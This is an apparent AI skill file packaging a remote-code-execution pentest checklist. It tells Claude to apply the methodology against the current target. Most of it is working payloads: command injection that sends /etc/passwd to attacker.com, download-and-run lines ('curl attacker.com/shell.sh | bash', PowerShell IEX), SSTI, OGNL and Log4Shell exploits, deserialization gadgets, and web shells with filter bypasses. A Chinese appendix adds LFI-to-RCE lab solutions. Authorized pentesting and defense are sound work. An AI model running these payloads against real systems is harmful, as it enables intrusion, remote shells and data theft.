---
name: offensive-rce
description: 'Remote Code Execution testing checklist: OS command injection, SSTI-to-RCE,
  deserialization RCE, file upload RCE, XXE with SSRF to RCE, RCE via dependency confusion,
  and CVE-based RCE patterns. Use for web app pentests and bug bounty RCE discovery.'
---

# SKILL: Remote Code Execution

## Metadata
- **Skill Name**: rce
- **Folder**: offensive-rce
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/rce.md

## Description
Remote Code Execution testing checklist: OS command injection, SSTI-to-RCE, deserialization RCE, file upload RCE, XXE with SSRF to RCE, RCE via dependency confusion, and CVE-based RCE patterns. Use for web app pentests and bug bounty RCE discovery.

## Trigger Phrases
Use this skill when the conversation involves any of:
`RCE, remote code execution, command injection, OS injection, SSTI RCE, deserialization RCE, file upload RCE, XXE RCE, dependency confusion, code execution`

## Instructions for Claude

When this skill is active:
1. Load and apply the full methodology below as your operational checklist
2. Follow steps in order unless the user specifies otherwise
3. For each technique, consider applicability to the current target/context
4. Track which checklist items have been completed
5. Suggest next steps based on findings

---

## Full Methodology

# Remote Code Execution

occurs when an attacker can execute arbitrary code on a target machine because of a vulnerability or misconfiguration.

## Shortcut

1. Identify suspicious user input locations. for code injections, take note of every user input location, including URL parameters, HTTP headers, body parameters, and file uploads. to find potential file inclusion vulnerabilities, check for input locations being used to inclusion vulnerabilities, check for input locations being used to determine or, construct filenames and, for file upload functions.
2. Submit test payloads to the input locations in order to detect potential vulnerabilities.
3. If your requests are blocked, try protection bypass techniques and see if your payload succeeds.
4. Finally, confirm the vulnerability by trying to execute harmless commands such as `whoami`, `ls`, and, `sleep 5`.

## Mechanisms

### Code Injection

This program takes a user input string, pass it through `eval()` and return the results:

```python
def calculate(input):
  return eval("{}".format(input))

result = calculate(user_input.calc)
print("The result is {}.".format(result))
```

an attacker could provide the application with something more malicious instead:

```http
GET /calculator?calc="__import__('os').system('ls')"
Host: example.com
```

### File Inclusion

making the target server include a file containing malicious code.

```php
<?php
  // Some PHP code

  $file = $_GET["page"];
  include $file;

  // Some PHP code
?>
```

if the application doesn't limit which file the user includes with the page parameter, an attacker can include a malicious PHP file.

```php
<?PHP
  system($_GET["cmd"]);
?>
```

and then they can run commands:

```http
http://example.com/?page=http://attacker.com/malicious.php?cmd=ls
```

### Command Injection

Untrusted data flows into OS command execution APIs.

Examples:

```python
subprocess.run("ping -c 1 " + user, shell=True)  # vulnerable
subprocess.run(["ping", "-c", "1", user], shell=False)  # safer
```

Detect via time/delay payloads (`&& sleep 5`), OAST/DNS callbacks, and out-of-band responses.

### Server-Side Template Injection (SSTI)

User-controlled template strings evaluated by template engines (Jinja2, Twig, Freemarker, Thymeleaf) can lead to RCE.

Probe with arithmetic/concat markers, escalate using engine-specific object graphs. Tools: `tplmap`.

### Insecure Deserialization

Deserializing untrusted data (Java, .NET, PHP, Python `pickle`) can trigger gadget chains to RCE.

Test with known gadget payloads (e.g., `ysoserial`, `marshalsec`), and observe blind effects via OAST.

### Unsafe YAML and Config Parsers

Loading YAML with object constructors (`yaml.load` vs `safe_load`) can lead to code execution.

### File Upload → Processing Chains

Upload parsers (ImageMagick, ExifTool, video transcoders) may execute/parse complex formats leading to RCE. Test with harmless PoCs and OAST.

## Hunt

### 1. Identify Input Vectors

Map all user-controlled input that could lead to code execution:

- **Command-line argument injection**: APIs that execute shell commands, CLI tools, system utilities
- **Template engines**: User-provided templates or template variables (Jinja2, Twig, Freemarker, Thymeleaf, ERB, Handlebars)
- **File uploads**: Server-side processing of images, documents, archives, media files
- **Deserialization endpoints**: APIs accepting serialized objects (Java, .NET, Python pickle, PHP serialize, Ruby Marshal)
- **Expression Language fields**: Search filters, calculations, dynamic queries (SpEL, OGNL, MVEL, EL)
- **Webhook URLs**: Server-side fetches triggered by user-supplied URLs
- **Log file paths**: Log injection leading to log processing (LogForge, Log4Shell)
- **Configuration files**: Upload or modification of config files (.htaccess, web.config, cron jobs)
- **Email/document processing**: Mail parsers, PDF generators, office document converters
- **Image manipulation**: ImageMagick, GraphicsMagick, Pillow, GD library operations
- **Video/audio processing**: FFmpeg, ExifTool, media transcoders

### 2. Test Payloads by Context

#### Command Injection Payloads

**Linux/Unix:**

```bash
# Basic injection
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)

# Time-based detection
; sleep 10
| sleep 10 &
|| ping -c 10 127.0.0.1

# Out-of-band (OAST)
; nslookup $(whoami).attacker.com
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(cat /etc/passwd | base64)

# Space bypasses
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Command obfuscation
c''at /etc/passwd
c\at /etc/passwd
c"a"t /etc/passwd
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# Wildcard injection
/???/??t /???/??ss??
/???/n? 127.0.0.1

# Variable expansion
a=w;b=hoami;$a$b
```

**Windows:**

```cmd
# Basic injection
& whoami
&& whoami
| whoami
|| whoami
; whoami

# Newline injection
%0a whoami

# Time-based
| ping -n 10 127.0.0.1
& timeout /t 10

# OAST
& nslookup %USERNAME%.attacker.com
& certutil -urlcache -split -f http://attacker.com/beacon

# PowerShell execution
& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

#### Server-Side Template Injection (SSTI) Payloads

**Jinja2 (Python - Flask, Ansible):**

```python
# Detection
{{7*7}}                              # Returns 49
{{7*'7'}}                            # Returns 7777777

# Reconnaissance
{{config}}
{{config.items()}}
{{self}}
{%debug%}

# RCE via __subclasses__
{{''.__class__.__mro__[1].__subclasses__()}}

# Find useful classes
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}

# subprocess.Popen
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

# Modern bypass (Python 3)
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

# Lipsum object abuse
{{lipsum.__globals__['os'].popen('whoami').read()}}

# Cycler object
{{cycler.__init__.__globals__.os.popen('whoami').read()}}
```

**Twig (PHP - Symfony):**

```twig
# Detection
{{7*7}}

# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}

# Alternative
{{_self.env.enableDebug()}}
{{_self.env.isDebug()}}

# PHP filter chain (modern)
{{["id"]|filter("system")}}
```

**Freemarker (Java):**

```java
# Detection
${7*7}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}

# Alternative
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign method=clazz.getMethod("getRuntime",null)>
<#assign runtime=method.invoke(null,null)>
<#assign method=clazz.getMethod("exec",classLoader.loadClass("java.lang.String"))>
${method.invoke(runtime,"whoami")}
```

**Thymeleaf (Java - Spring):**

```java
# Detection
[[${7*7}]]

# RCE
${T(java.lang.Runtime).getRuntime().exec('whoami')}
[[${T(java.lang.Runtime).getRuntime().exec('whoami')}]]

# Spring EL alternative
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
```

**ERB (Ruby - Rails):**

```ruby
# Detection
<%= 7*7 %>

# RCE
<%= system("whoami") %>
<%= `whoami` %>
<%= IO.popen('whoami').readlines() %>
<%= %x(whoami) %>
```

**Velocity (Java):**

```java
# Detection
#set($x = 7 * 7)$x

# RCE
#set($rt = $class.forName("java.lang.Runtime"))
#set($chr = $class.forName("java.lang.Character"))
#set($str = $class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$chr.toString($out.read())
#end
```

**Handlebars (JavaScript/Node.js):**

```javascript
# Detection
{{7*7}}

# RCE (if helper is vulnerable)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

#### Expression Language (EL) Injection

**Spring SpEL (Spring Framework):**

```java
# Detection
${7*7}
#{7*7}

# RCE
${T(java.lang.Runtime).getRuntime().exec('whoami')}
#{T(java.lang.Runtime).getRuntime().exec('whoami')}

# Alternative methods
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}

# Bypass blacklist
${T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"whoami"})}
```

**OGNL (Object-Graph Navigation Language - Struts):**

```java
# Detection
${7*7}

# RCE
${@java.lang.Runtime@getRuntime().exec('whoami')}

# CVE-2017-5638 (Content-Type exploitation)
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

**MVEL (MVFLEX Expression Language):**

```java
# Detection
${7*7}

# RCE
Runtime.getRuntime().exec("whoami");
```

#### Deserialization Payloads

**Java (using ysoserial):**

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/beacon' | base64

# Popular gadget chains
ysoserial CommonsCollections1
ysoserial CommonsCollections6
ysoserial CommonsCollections7
ysoserial Spring1
ysoserial Spring2
ysoserial Jdk7u21
ysoserial Hibernate1
```

**.NET (using ysoserial.net):**

```bash
# Generate payload
ysoserial.exe -g ObjectDataProvider -f Json -c "calc.exe"
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell.exe -c whoami"

# Gadgets
TypeConfuseDelegate
ObjectDataProvider
PSObject
WindowsIdentity
```

**Python pickle:**

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

**PHP serialize:**

```php
# Magic methods for exploitation
__wakeup()
__destruct()
__toString()

# Example payload
O:8:"stdClass":1:{s:4:"file";s:17:"/etc/passwd";}
```

### 3. Advanced Techniques

#### Blind RCE Detection

**Time-Based:**

```bash
# Linux
; sleep 10
| ping -c 10 127.0.0.1
| timeout 10

# Windows
| ping -n 10 127.0.0.1
& timeout /t 10
```

**Out-of-Band (OAST) using Burp Collaborator:**

```bash
# DNS exfiltration
; nslookup $(whoami).burpcollaborator.net
; dig $(whoami).burpcollaborator.net

# HTTP callback
; curl http://burpcollaborator.net
; wget http://burpcollaborator.net/$(whoami)

# DNS with data exfiltration
; cat /etc/passwd | base64 | xargs -I {} nslookup {}.burpcollaborator.net
```

#### Bypass Techniques

**Blacklist Bypasses:**

```bash
# Case variation
WhOaMi
wH%6f%61%6Di

# Encoding
wh\u006fami
wh\x6fami
echo "d2hvYW1p" | base64 -d | sh

# Line continuation
wh\
oami

# Comments (bash)
wh#comment
oami

# Null byte (legacy)
whoami%00.jpg
```

**WAF Bypasses:**

```bash
# Unicode/encoding
wh\u006fami

# Hex encoding
\x77\x68\x6f\x61\x6d\x69

# Concatenation
'wh'+'oami'
"wh"+"oami"

# Variable expansion
a=w;b=hoami;$a$b
```

### 4. Confirm the Vulnerability

Execute harmless commands to prove RCE without causing damage:

```bash
# Safe verification commands
whoami
id
pwd
hostname
uname -a
cat /etc/issue
systeminfo (Windows)

# Create proof file
echo "pwned_by_researcher" > /tmp/proof.txt

# Time-based confirmation
sleep 10 && curl http://attacker.com/confirmed
```

**Practical Tactics:**

- Use time-based payloads for blind cases; confirm via differential latency (baseline vs payload response time)
- Use OAST (Burp Collaborator, Interactsh) to detect out-of-band DNS/HTTP callbacks
- For deserialization, try signed/unsigned object tampering and gadget canaries
- For uploads, verify server-side processing paths (thumbnails, metadata extraction, AV scanning windows)
- Test multiple injection points in parallel; backend queue processing may delay execution
- Monitor server-side logs if accessible (error logs often reveal stack traces)

## Vulnerabilities

### File Upload → RCE Chains

#### 1. Web Shell Upload

**PHP Web Shells:**

```php
# Minimal shell
<?php system($_GET['c']); ?>

# Bypass extension filters
shell.php.jpg
shell.php%00.jpg     # Null byte (PHP <5.3)
shell.php%0a.jpg     # Newline
shell.php.....       # Multiple dots
shell.pHp            # Case variation
shell.php%20         # Trailing space
shell.php::$DATA     # Windows NTFS ADS
shell.php/           # Trailing slash (IIS)

# Content-Type manipulation
Content-Type: image/jpeg
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"

# Polyglot files (valid image + PHP)
GIF89a<?php system($_GET['c']); ?>
```

**ASP/ASPX Shells:**

```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Process.Start("cmd.exe", "/c " + Request["c"]); %>
```

**JSP Shells:**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```

#### 2. .htaccess / web.config Injection

**.htaccess to enable PHP in images:**

```apache
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg

# Alternative
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

**web.config to enable ASP in images:**

```xml
<configuration>
  <system.webServer>
    <handlers>
      <add name="jpg" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" />
    </handlers>
  </system.webServer>
</configuration>
```

#### 3. Archive Extraction (Zip Slip - CVE-2018-1002200)

```bash
# Create malicious zip with path traversal
ln -s ../../../../../../../etc/cron.d/evil evil.txt
zip --symlinks evil.zip evil.txt

# Or craft manually with path traversal
evil/
  ../../../../var/www/html/shell.php
  ../../../../etc/cron.d/backdoor
```

**Testing:**

- Upload zip/tar containing paths with `../`
- Symlink to sensitive locations
- Overwrite cron jobs, SSH keys, web roots

#### 4. ImageMagick Exploits

**ImageTragick (CVE-2016-3714):**

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/shell.jpg"|whoami")'
pop graphic-context
```

**Modern ImageMagick RCE (CVE-2022-44268):**

```bash
# Arbitrary file read
convert -size 1x1 xc:red -set "profile:1" "/etc/passwd" exploit.png

# Exploitation
convert exploit.png output.png
identify -verbose output.png | grep "Raw profile type"
```

**Other ImageMagick vectors:**

- MSL (Magick Scripting Language) injection
- Label injection for RCE
- SVG with embedded scripts

#### 5. PDF Processing RCE

**PDF with JavaScript:**

```javascript
app.alert({ cMsg: "XSS", cTitle: "XSS" });

// File system access (if enabled)
this.exportDataObject({ cName: "test", nLaunch: 2 });
```

**LaTeX Injection:**

```latex
\documentclass{article}
\immediate\write18{whoami}
\begin{document}
Hello World
\end{document}

# Alternative
\input{|"whoami"}
```

**XSL-FO Injection (Apache FOP):**

```xml
<fo:instream-foreign-object>
  <svg:svg>
    <svg:script>java.lang.Runtime.getRuntime().exec("whoami")</svg:script>
  </svg:svg>
</fo:instream-foreign-object>
```

#### 6. Office Document Processing

**XXE in DOCX/XLSX:**

```xml
# Extract document1.xml from DOCX
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

**Macro-enabled Documents:**

- DOCM, XLSM, PPTM files with VBA macros
- Excel 4.0 macros (XLM) bypass modern protections
- DDE (Dynamic Data Exchange) injection

**LibreOffice/OpenOffice Exploits:**

- CVE-2023-2255: Remote code execution via crafted documents
- Python macro execution in LibreOffice

### Log4Shell (CVE-2021-44228)

**Basic Payloads:**

```bash
${jndi:ldap://attacker.com/a}
${jndi:rmi://attacker.com/a}
${jndi:dns://attacker.com/a}

# Common injection points
User-Agent: ${jndi:ldap://attacker.com/a}
X-Api-Version: ${jndi:ldap://attacker.com/a}
Referer: ${jndi:ldap://attacker.com/a}
```

**Obfuscation Bypasses:**

```bash
# Lowercase/uppercase
${${lower:j}ndi:ldap://attacker.com/a}
${${upper:j}ndi:ldap://attacker.com/a}

# Environment variables
${j${env:NOTHING:-n}di:ldap://attacker.com/a}

# Nested lookups
${jnd${sys:java.version:-i}:ldap://attacker.com/a}

# Multiple levels
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```

**Setup LDAP server for exploitation:**

```bash
# Using marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# Exploit.java - compile and host
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("curl http://attacker.com/pwned");
        } catch (Exception e) {}
    }
}
```

### Prototype Pollution → RCE (Node.js)

**Pollute Object prototype:**

```javascript
// Via JSON
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// Via query parameters
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
```

**Escalate to RCE:**

```javascript
// Pollute child_process options
{
  "__proto__": {
    "shell": "/bin/sh",
    "argv0": "console.log(require('child_process').execSync('whoami').toString())//"
  }
}

// Pollute via NODE_OPTIONS
{"__proto__": {"NODE_OPTIONS": "--require /tmp/malicious.js"}}

// CVE-2022-21824 - Prototype pollution in VM module
```

### FFmpeg / ExifTool Exploits

**FFmpeg SSRF (CVE-2016-1897, CVE-2016-1898):**

```
# Playlist SSRF
concat:http://attacker.com/playlist|file:///etc/passwd

# HLS SSRF
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://internal.server/admin
```

**ExifTool RCE (CVE-2021-22204):**

```bash
# Create malicious image with DjVu exploit
exiftool -config exploit.config '-HasselbladExif<=exploit.jpg' malicious.jpg
```

### SQL Injection → RCE

**MySQL:**

```sql
-- Write web shell
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Read file
LOAD_FILE('/etc/passwd');

-- UDF exploitation
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('whoami');
```

**PostgreSQL:**

```sql
-- COPY TO PROGRAM (9.3+)
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/beacon';

-- Large Object + lo_export
SELECT lo_create(-1);
INSERT INTO pg_largeobject VALUES (-1, 0, decode('<?php system($_GET["c"]); ?>', 'base64'));
SELECT lo_export(-1, '/var/www/html/shell.php');
```

**MSSQL:**

```sql
-- xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- OLE Automation
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami';
```

### Container Escape → RCE

**Docker Socket Exposure:**

```bash
# If /var/run/docker.sock is mounted
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
```

**Privileged Container:**

```bash
# From privileged container
mkdir /tmp/exploit
mount /dev/sda1 /tmp/exploit
chroot /tmp/exploit sh
```

**Kernel Exploits:**

- Dirty COW (CVE-2016-5195)
- DirtyPipe (CVE-2022-0847)
- DirtyCred (CVE-2022-2588)

## Chaining and Escalation

### 1. Path Traversal → RCE

```bash
# Overwrite SSH authorized_keys
PUT /upload?path=../../.ssh/authorized_keys

# Overwrite cron job
PUT /upload?path=../../etc/cron.d/backdoor
Content: * * * * * root curl http://attacker.com/shell.sh | bash

# Overwrite bash profile
PUT /upload?path=../../.bashrc

# Overwrite PHP auto-prepend
PUT /upload?path=../../.user.ini
Content: auto_prepend_file=/tmp/shell.php
```

### 2. SSRF → RCE

```bash
# SSRF to cloud metadata → IAM creds
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF to internal admin → RCE
http://internal:8080/admin/exec?cmd=whoami

# SSRF to Redis → cron job
http://localhost:6379
CONFIG SET dir /etc/cron.d/
CONFIG SET dbfilename root
SET 1 "* * * * * root curl http://attacker.com/shell.sh | bash"
SAVE
```

### 3. XXE → RCE

```xml
# XXE + PHP expect wrapper
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://whoami">
]>
<root>&xxe;</root>

# XXE + JAR protocol (Java)
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:http://attacker.com/malicious.jar!/payload.class">
]>
```

### 4. SSTI → File Write → RCE

```python
# Jinja2 write web shell
{{''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php system($_GET["c"]); ?>')}}
```

## Real-World CVEs and Cases

### Critical RCE Vulnerabilities

1. **CVE-2021-44228 - Log4Shell (Apache Log4j)**:
   - JNDI injection in logging library
   - Affected: Minecraft, VMware, Cisco, countless others
   - Impact: Unauthenticated RCE on millions of systems

2. **CVE-2022-22965 - Spring4Shell (Spring Framework)**:
   - Class loader manipulation via property binding
   - Impact: RCE on Spring MVC applications

3. **CVE-2021-3129 - Laravel Debug Mode RCE**:
   - Ignition debug page deserialization
   - Impact: Unauthenticated RCE on Laravel apps with debug enabled

4. **CVE-2019-0193 - Apache Solr RCE**:
   - Velocity template injection
   - Impact: Unauthenticated RCE on Solr instances

5. **CVE-2017-5638 - Apache Struts2 RCE**:
   - OGNL injection via Content-Type header
   - Impact: Led to Equifax breach affecting 147M people

6. **CVE-2020-1938 - Ghostcat (Apache Tomcat)**:
   - AJP protocol file read/inclusion
   - Impact: RCE via arbitrary file write

7. **CVE-2022-26134 - Confluence RCE**:
   - OGNL injection in Confluence Server/Data Center
   - Impact: Unauthenticated RCE

8. **CVE-2018-1002200 - Kubernetes Arbitrary File Overwrite (Zip Slip)**:
   - Path traversal in tar/zip extraction
   - Impact: Container escape via kubectl cp

9. **CVE-2016-3714 - ImageTragick (ImageMagick)**:
   - Command injection via image processing
   - Impact: RCE on image upload features

10. **CVE-2021-22204 - ExifTool RCE**:
    - DjVu metadata command injection
    - Impact: RCE via image metadata parsing

### Impact Categories

- **Critical**: Unauthenticated RCE on internet-facing services
- **High**: Authenticated RCE or unauthenticated RCE requiring interaction
- **Medium**: RCE requiring specific configuration or low-privilege authentication
- **Low**: RCE requiring admin access or highly specific conditions

## Remediation Recommendations

Avoid inserting user input into code that gets evaluated. Also treat user uploaded files as untrusted, and avoid including file based on user input.

### Defensive Checklist

- **Eliminate Dangerous Functions**: Remove `eval`, `exec`, `Function`, `subprocess.shell=True`, `Runtime.exec()` where possible
- **Parameterized Execution**: Use parameterized/array-based process execution (`shell=False`); escape+allowlist arguments
- **Template Engine Hardening**: Disable dangerous functions/tags; enable sandbox mode; don't accept user templates
- **Strict Upload Validation**:
  - Enforce content-type AND extension checks
  - Verify via magic bytes (file signature)
  - Re-encode/process files (strip metadata with exiftool -all=)
  - Store uploads outside web root
- **Sandbox File Processing**:
  - Process uploads in isolated containers/VMs
  - Use seccomp, AppArmor, SELinux restrictions
  - Run as non-root with minimal permissions
  - No network access during processing
  - Delay publish until validation completes
- **Safe Deserialization**:
  - Prefer JSON/XML with strict schemas
  - Sign and verify serialized data
  - Avoid `pickle`, `marshal`, native object graphs
  - Use allowlists for permitted classes
- **Dependency Management**:
  - Keep libraries updated (ImageMagick, ExifTool, FFmpeg, Log4j, etc.)
  - Pin versions and audit dependencies
  - Subscribe to security advisories
  - Use tools: `npm audit`, `pip-audit`, `OWASP Dependency-Check`
- **Network Segmentation**:
  - Implement egress filtering to prevent OAST callbacks
  - Restrict outbound connections from app servers
  - Monitor DNS queries for suspicious patterns
- **WAF/RASP**:
  - Deploy Web Application Firewall with RCE signatures
  - Consider Runtime Application Self-Protection (RASP)
  - Log and alert on suspicious payloads
- **Log4Shell Specific**:
  - Update to Log4j 2.17.1+
  - Set `log4j2.formatMsgNoLookups=true`
  - Remove JndiLookup class from classpath
  - Monitor for obfuscated JNDI patterns

### Testing Tools

- **SSTI**: `tplmap`, `SSTImap`
- **Deserialization**: `ysoserial`, `ysoserial.net`, `marshalsec`
- **Command Injection**: Burp Intruder, `commix`
- **General**: Burp ActiveScan, `nuclei` templates, `jaeles` signatures
- **OAST**: Burp Collaborator, Interactsh, canarytokens.org


---

# 实测武器：黑名单绕过与 LFI→RCE 链（TSec 实测沉淀）

> 以下均来自真实靶场破题，按成功率排序。

## 1. chr() 拼接绕过代码执行黑名单（a-12 实测）

```bash
# 场景：/api/execute 过滤 _ [ ] 及 eval/exec/open/import/file/compile/commands/subprocess 子串
# 绕过：用 chr() 拼出被禁字符串
payload = "print(open('/challenge/flag.txt').read())"
# 用 chr(95) 拼下划线、chr(91)/chr(93) 拼中括号，配合 getattr 链
# 响应特征：直接返回命令输出
```

## 2. filename 参数命令注入（a-09 实测）

```bash
# 场景：/api.php?action=export 的 filename 参数拼接进 shell 命令
curl -sS -G "http://TGT/api.php" --data-urlencode "action=export" --data-urlencode "filename=x;cat /challenge/flag.txt;echo"
# 响应特征：导出文件内容/报错里回显命令结果
```

## 3. SSRF 链 → 命令注入（a-14 实测）

```bash
# 场景：/api/import 的 target_endpoint 字段 SSRF 访问内网 admin-api；admin-api 的 archive filename 参数命令注入
curl -sS -X POST "http://TGT/api/import" -H 'Content-Type: application/json' \
  -d '{"target_endpoint":"http://127.0.0.1:8000/admin-api/archive","filename":"x;cat /challenge/flag.txt;echo"}'
```

## 4. LFI → RCE 升级（2026-07-31 b-01 实测）
- pearcmd：`?lang=....//....//....//....//usr/local/lib/php/pearcmd.php&+config-create+/&file=/tmp/s.php&/<?=eval($_POST[1])?>+/tmp/pwn.php`（路径多版本探测）
- 日志投毒：UA 注入 `<?php system($_GET["c"]); ?>` → 包含 access.log
- session 投毒：恶意 PHPSESSID → 包含 session 文件
